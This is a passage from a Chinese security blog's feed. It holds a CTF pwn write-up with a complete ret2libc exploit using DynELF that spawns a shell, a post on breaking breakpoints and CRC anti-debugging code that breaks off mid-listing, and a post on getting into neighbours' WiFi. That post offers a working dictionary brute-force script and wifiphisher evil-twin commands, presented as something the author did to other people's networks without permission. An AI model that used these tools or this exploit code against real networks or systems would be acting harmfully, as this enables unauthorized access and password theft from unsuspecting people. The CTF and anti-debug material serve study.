//nedbatchelder.com/blog/201206/eval really is_dangerous.html</li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>其实发现，国内的比赛和国外的比赛，有些赛事质量真的差很多，国内很多比赛都是为了出题而出题，相反，其实国外的比赛虽然很难，但是攻克的过程中，都能学到许多的姿势。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leak技巧以及DynELF的温习</title>
      <link href="Memory-Leak-with-DynELF.html"/>
      <url>Memory-Leak-with-DynELF.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>一个简单的溢出，</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/eynelf-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/eynelf-01.png"></a></p><p>read()函数的不正当使用引起的漏洞</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-02.png"></a></p><p>我们分析汇编代码，基本可以推断出他的溢出字节是140，因为这里我们要求不提供libc，但是我没需要起shell，那么思路大概就是首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。</p><h1 id="构造Leak函数"><a href="#构造Leak函数" class="headerlink" title="构造Leak函数"></a>构造Leak函数</h1><p>pwntools提供的DynELF模块来进行内存搜索。关键我们需要一个leak(addr)函数。一般这种函数的构造如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">140</span> + p32(writePlt) + p32(vulner) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;address(%#x) =&gt; %s&#x27;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./level2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。<br>关键的是，我们只能调用到sytem()，却不能直接起shell，我们还需要将`/bin/sh``写到BSS段</p><h1 id="如何找到bss段"><a href="#如何找到bss段" class="headerlink" title="如何找到bss段"></a>如何找到bss段</h1><p>在蒸米的文章中，他是通过<code>readelf -S level2</code>这样的命令，找打的bss段的地址，而我比较习惯用IDA做前期的分析，所以我会用<code>Shift+F7</code>来找bss段，效果如下</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-03.png"></a></p><p>.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。</p><h1 id="查找gadget-构造rop"><a href="#查找gadget-构造rop" class="headerlink" title="查找gadget 构造rop"></a>查找gadget 构造rop</h1><p>执行完read()之后，调用的是**system(“/bin/sh/“)**，我们知道的是，read()的参数有三个，所以我们需要保证栈平衡，需要构造一个pop pop pop ret 的gadget，如何找到这gadget呢，正如蒸米大神说的，利用objdump，具体我们可以用如下的命令<br><code>objdump -D level2 |cat -n |grep pop</code>效果如下:<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-04.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-04.png"></a></p><p>这样，我们找到这样连续的3个pop，就能构造rop了。</p><h1 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>,<span class="number">9880</span>)</span><br><span class="line"></span><br><span class="line">vulner = <span class="number">0x0804844b</span></span><br><span class="line">readPlt = <span class="number">0x08048310</span></span><br><span class="line">writePlt = <span class="number">0x08048340</span></span><br><span class="line">bssAddr = <span class="number">0x0804a024</span></span><br><span class="line">pppr =  <span class="number">0x08048509</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">140</span> + p32(writePlt) + p32(vulner) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;address(%#x) =&gt; %s&#x27;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;./level4&#x27;</span>))</span><br><span class="line">systemAddr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;systemAddr = %#x&#x27;</span> % (systemAddr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">140</span> + p32(readPlt) + p32(pppr) + p32(<span class="number">0</span>) + p32(bssAddr) + p32(<span class="number">8</span>)</span><br><span class="line">payload += p32(systemAddr) + p32(<span class="number">0xdeadbeef</span>) + p32(bssAddr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://wooyun.bestwing.top:5000/static/drops/papers-7551.html">原文地址</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蹭隔壁的WiFI</title>
      <link href="WiFi_Attack.html"/>
      <url>WiFi_Attack.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在家，由于某些原因家里还没网。老是去别人家蹭，都不好意思了。也试着跑隔壁的弱口令，但是没解决，想跑Pin吧，但是没环境。几经挫折，最后终于拿下了，可是信号好差……</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>其实，我们蹭到隔壁无线的方法，最笨的有咱们可以跑跑字典阿，试试弱口令阿，实在不行，咱们可以利用Kali下的工具跑跑Pin码，甚至做一些更猥琐的事情。比如下面的内容。</p><h1 id="0x01-跑字典"><a href="#0x01-跑字典" class="headerlink" title="0x01 跑字典"></a>0x01 跑字典</h1><p>一开始我试了几个弱口令，但是虽然是小村子，但是隔壁的wifi还是不少，我总不能一个一个试吧，这一点都不优雅，所以想到之前看到的python的一个模块，叫<strong>pywifi</strong>。得 咱们写一个脚本来跑跑密码吧。</p><p>关键代码如下<br><strong>热点扫描</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scans</span>(<span class="params">face,timeout</span>):</span></span><br><span class="line">    <span class="comment">#开始扫描</span></span><br><span class="line">    face.scan()</span><br><span class="line">    time.sleep(timeout)</span><br><span class="line">    <span class="comment">#在若干秒后获取扫描结果</span></span><br><span class="line">    <span class="keyword">return</span> face.scan_results()</span><br></pre></td></tr></table></figure><p><strong>热点攻击</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">i,face,x,key,stu,ts</span>):</span></span><br><span class="line">    <span class="comment">#显示对应网络名称，考虑到部分中文名啧显示bssid</span></span><br><span class="line">    showID = x.bssid <span class="keyword">if</span> len(x.ssid)&gt;len(x.bssid) <span class="keyword">else</span> x.ssid</span><br><span class="line">    <span class="comment">#迭代字典并进行爆破</span></span><br><span class="line">    <span class="keyword">for</span> n,k <span class="keyword">in</span> enumerate(key):</span><br><span class="line">        x.key = k.strip()</span><br><span class="line">        <span class="comment">#移除所有热点配置</span></span><br><span class="line">        face.remove_all_network_profiles()</span><br><span class="line">        <span class="comment">#讲封装好的目标尝试连接</span></span><br><span class="line">        face.connect(face.add_network_profile(x))</span><br><span class="line">        <span class="comment">#初始化状态码，考虑到用0会发生些逻辑错误</span></span><br><span class="line">        code = <span class="number">10</span></span><br><span class="line">        t1 = time.time()</span><br><span class="line">        <span class="comment">#循环刷新状态，如果置为0则密码错误，如超时则进行下一个</span></span><br><span class="line">        <span class="keyword">while</span> code!=<span class="number">0</span> :</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            code = face.status()</span><br><span class="line">            now = time.time()-t1</span><br><span class="line">            <span class="keyword">if</span> now&gt;ts:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            stu.write(<span class="string">&quot;\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s&quot;</span>%(<span class="number">6</span>,i,<span class="number">18</span>,showID,code,<span class="number">5</span>,now,<span class="number">7</span>,x.signal,<span class="number">10</span>,len(key)-n,<span class="number">10</span>,k.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)))</span><br><span class="line">            stu.flush()</span><br><span class="line">            <span class="keyword">if</span> code == <span class="number">4</span>:</span><br><span class="line">                face.disconnect()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;%-*s| %s | %*s |%*s\n&quot;</span>%(<span class="number">20</span>,x.ssid,x.bssid,<span class="number">3</span>,x.signal,<span class="number">15</span>,k)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#扫描时常</span></span><br><span class="line">    scantimes = <span class="number">3</span></span><br><span class="line">    <span class="comment">#单个密码测试延迟</span></span><br><span class="line">    testtimes = <span class="number">15</span></span><br><span class="line">    output = sys.stdout</span><br><span class="line">    <span class="comment">#结果文件保存路径</span></span><br><span class="line">    files = <span class="string">&quot;TestRes.txt&quot;</span></span><br><span class="line">    <span class="comment">#字典列表</span></span><br><span class="line">    keys = open(sys.argv[<span class="number">1</span>],<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;|KEYS %s&quot;</span>%(len(keys))</span><br><span class="line">    <span class="comment">#实例化一个pywifi对象</span></span><br><span class="line">    wifi = PyWiFi()</span><br><span class="line">    <span class="comment">#选择定一个网卡并赋值于iface</span></span><br><span class="line">    iface = wifi.interfaces()[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#通过iface进行一个时常为scantimes的扫描并获取附近的热点基础配置</span></span><br><span class="line">    scanres = scans(iface,scantimes)</span><br><span class="line">    <span class="comment">#统计附近被发现的热点数量</span></span><br><span class="line">    nums = len(scanres)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;|SCAN GET %s&quot;</span>%(nums)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s&quot;</span>%(<span class="string">&quot;-&quot;</span>*<span class="number">70</span>,<span class="number">6</span>,<span class="string">&quot;WIFIID&quot;</span>,<span class="number">18</span>,<span class="string">&quot;SSID OR BSSID&quot;</span>,<span class="number">2</span>,<span class="string">&quot;N&quot;</span>,<span class="number">4</span>,<span class="string">&quot;time&quot;</span>,<span class="number">7</span>,<span class="string">&quot;signal&quot;</span>,<span class="number">10</span>,<span class="string">&quot;KEYNUM&quot;</span>,<span class="number">10</span>,<span class="string">&quot;KEY&quot;</span>,<span class="string">&quot;=&quot;</span>*<span class="number">70</span>)</span><br><span class="line">    <span class="comment">#将每一个热点信息逐一进行测试</span></span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> enumerate(scanres):</span><br><span class="line">        <span class="comment">#测试完毕后，成功的结果讲存储到files中</span></span><br><span class="line">        res = test(nums-i,iface,x,keys,output,testtimes)</span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            open(files,<span class="string">&quot;a&quot;</span>).write(res)</span><br></pre></td></tr></table></figure><p><em>作者：面包君<br>链接：<a href="https://zhuanlan.zhihu.com/p/25149544">https://zhuanlan.zhihu.com/p/25149544</a></em></p><p>但是一点软用都没有，没辙，难道我也要去跑Pin码吗？但是峰回路转，我看到这篇文章附赠了一个链接。</p><h1 id="0x02-wifiphisher"><a href="#0x02-wifiphisher" class="headerlink" title="0x02 wifiphisher"></a>0x02 wifiphisher</h1><p><strong>主要原理</strong></p><ul><li>创建一个伪AP来“狸猫换太子”，然后撤销用户AP的授权，</li><li>通知用户需要进行“固件升级”，需要重新验证密码。你的假AP由于具有相同的SSID，用户便会“交代”密码。</li><li>这样你就能得到用户的密码，并且让用户采用你的伪AP做为自己的接入点。而对方一无所知。</li></ul><p>从文章的介绍来看，是有相似的脚本的，比如它所提到的<code>Airsnaf</code>，不过这里文章所说的是Wifiphisher<br>Github源码 <a href="https://github.com/sophron/wifiphisher/releases/">链接</a><br><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/sophron/wifiphisher.git <span class="comment"># Download the latest revision</span></span><br><span class="line"><span class="built_in">cd</span> wifiphisher <span class="comment"># Switch to tool&#x27;s directory</span></span><br><span class="line">sudo python setup.py install <span class="comment"># Install any dependencies (Currently, hostapd, dnsmasq, PyRIC, blessings) </span></span><br></pre></td></tr></table></figure><p><strong>Usage</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifiphisher -aI wlan0 -jI wlan4 -p firmware-upgrade</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifiphisher --essid CONFERENCE_WIFI -p plugin_update -pK s3cr3tp4ssw0rd</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/a5c1a17024a880122d4fa0c825f60112eda5d79f/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373352e706e67" class="gallery-item"><img src="https://camo.githubusercontent.com/a5c1a17024a880122d4fa0c825f60112eda5d79f/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373352e706e67"></a><br><a href="https://camo.githubusercontent.com/edac2b531e778d7c1e899743e5aecda7e322e1b5/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373322e706e67" class="gallery-item"><img src="https://camo.githubusercontent.com/edac2b531e778d7c1e899743e5aecda7e322e1b5/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373322e706e67"></a></p><p>更多详细资料 <a href="https://github.com/sophron/wifiphisher">项目地址</a><br><a href="http://www.leiphone.com/news/201510/bKHbxozIz7zyYCFy.html">文章地址</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WiFi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>断点的那些事</title>
      <link href="Those-of-the-Breakpoint.html"/>
      <url>Those-of-the-Breakpoint.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>学习二进制的过程中我们总是会遇到断点，毕竟设置断点能使我们更好的调试程序。接触二进制以来，第一次比较清楚系统的了解了一下断点以及与断点有关的软件安全的东西。</p><h1 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h1><p>设置断点我们可以使一个进程的执行暂停在一个符合某种特定的条件的位置上，此时我们可以对程序的变量，栈上参数以及分配情况进行查看，并且在改变前我可以了解他们的面貌。因此，断点是我们调试程序几乎必不可少的功能，通常断点我们有三种</p><ul><li>软断点</li><li>硬件断点</li><li>内存断点<br>在后面的内容中，我可能会设计到针对软件调试，我们开发人员会用到的防御措施的关键代码。</li></ul><h1 id="软断点"><a href="#软断点" class="headerlink" title="软断点"></a>软断点</h1><p>软断点的设置能够使得目标进程在执行到一个位置指令的时候暂停执行，软断点是目前调试程序最长用到的断点类型。我们常用调试器的F2功能便是常见的软断点。它的实质就是一个单字节的指令，我们都知道 0xcc，即INT3指令的操作码，这个指令是告诉CPU暂停执行当前的进程，这也就是软断点的核心。<br>如下汇编:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,ebx</span><br></pre></td></tr></table></figure><p>这个汇编仅是简单的将寄存器中EBX的值存入EAX中。<br>而在X86环境下，其机器码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8BC3</span><br></pre></td></tr></table></figure><p>这才是CPU才可识别的机器语言， 机器码 分为成两部分，即操作码以及操作数。<br>设置软断点前:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x66554433;          8BC3                  mov eax,ebx</span><br></pre></td></tr></table></figure><p>设置软断点后:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x66554433;          CCC3                  mov eax,ebx</span><br></pre></td></tr></table></figure><p>我们可以看到前后的变化，双字节的操作码8BC3中被替换了一个字节，替换的的字节是INT3的中断指令，单字节值为0xcc。当CP执行到这里，并触碰到这个字节的时候，就引发了一个INT3的中断事件。而调试器是如何实现这个过程的呢？当调试器需要在一个内存地址上设置断点的时候，调试器首先读取内存上的第一个操作码字节，并存储在断点列表中，接着调试器将字节CC写入被读取的内存地址将至替换掉。接着就是CPU发生INT3事件，被调试器所捕获，接着调试器会查EIP是否指向我们设置断点的内存地址，如果是，调试器会将之前的数据写回内存地址中，当进程恢复执行，写回正确的字节数据。</p><p>而针对软断点，我们的开发者常用的保护措施就是CRC校验，即循环冗余校验，可以检测程序内容是否被改动，因为软断点改变了字节，肯定也改变了程序内存的CRC校验值。在XP，没有ASLR机制的时候，我们可以用如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">CRC32</span><span class="params">(BYTE* ptr,DWORD Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">  DWORD crcTable[<span class="number">256</span>],crcTmp1;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//动态生成CRC-32表</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">   &#123;</span><br><span class="line">    crcTmp1 = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">8</span>; j&gt;<span class="number">0</span>; j--)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">if</span> (crcTmp1&amp;<span class="number">1</span>) crcTmp1 = (crcTmp1 &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>L;</span><br><span class="line">       <span class="keyword">else</span> crcTmp1 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     crcTable[i] = crcTmp1;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">//计算CRC32值</span></span><br><span class="line">  DWORD crcTmp2= <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">  <span class="keyword">while</span>(Size--)</span><br><span class="line">  &#123;</span><br><span class="line">    crcTmp2 = ((crcTmp2&gt;&gt;<span class="number">8</span>) &amp; <span class="number">0x00FFFFFF</span>) ^ crcTable[ (crcTmp2^(*ptr)) &amp; <span class="number">0xFF</span> ];</span><br><span class="line">    ptr++;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> (crcTmp2^<span class="number">0xFFFFFFFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其次是具体的代码实现，具体有两个部分，一个是需要被保护的代码的和需要创建一个线程来计算校验值<br>假设要被保护的代码如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ProtectStart:   <span class="comment">//要保护的代码的起始地址</span></span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">         inc eax   <span class="comment">//花指令</span></span><br><span class="line">       dec eax</span><br><span class="line">       push eax</span><br><span class="line">       pop eax</span><br><span class="line">  &#125;</span><br><span class="line">start:</span><br><span class="line">     HMODULE hMod = GetModuleHandle(<span class="literal">NULL</span>);<span class="comment">//同样是花指令</span></span><br><span class="line">     HMODULE hUser32 = LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">ProtectEnd:               <span class="comment">//要保护代码的终结地址</span></span><br><span class="line">     DWORD dwThreadId = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">     STBINGLEPARAM stParam = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">       stParam.hEvent = CreateEvent(<span class="literal">NULL</span>,FALSE,FALSE,<span class="string">&quot;bingle&quot;</span>);</span><br><span class="line">     </span><br><span class="line">     DWORD dwAddr = <span class="number">0</span>;  <span class="comment">//一个缓存空间</span></span><br><span class="line">     __asm mov eax,offset ProtectStart  <span class="comment">//计算代码的起始地址</span></span><br><span class="line">     __asm mov dwAddr,eax</span><br><span class="line">     stParam.dwStart = dwAddr; <span class="comment">//保存在我们自己定义的结构体里</span></span><br><span class="line"></span><br><span class="line">       __asm mov eax,offset ProtectEnd <span class="comment">//计算保护代码的结束地址，同样保存在自己定义的                   结构体里。</span></span><br><span class="line">     __asm mov dwAddr,eax</span><br><span class="line">     stParam.dwEnd = dwAddr;</span><br><span class="line">     </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;开始了\n&quot;</span>);</span><br><span class="line">       CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)bingleProc,(LPVOID)&amp;stParam,<span class="number">0</span>,&amp;dwThreadId);</span><br></pre></td></tr></table></figure><p>创建线程,用来计算校验值<br>并且将线程的创建放在循环中，这样保证在程序运行的过程中，会不断的监视内存的数据是否改变。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">CreateThread(<span class="literal">NULL</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)bingleProc,(LPVOID)&amp;stParam,<span class="number">0</span>,&amp;dwThreadId);</span><br><span class="line"></span><br><span class="line">     DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">     dwRet = WaitForSingleObject(stParam.hEvent,INFINITE);</span><br><span class="line">     <span class="keyword">while</span>(dwRet == WAIT_OBJECT_0)</span><br><span class="line">     &#123;</span><br><span class="line">         Sleep(<span class="number">5000</span>);</span><br><span class="line">           CreateThread(<span class="literal">NULL</span>,<span 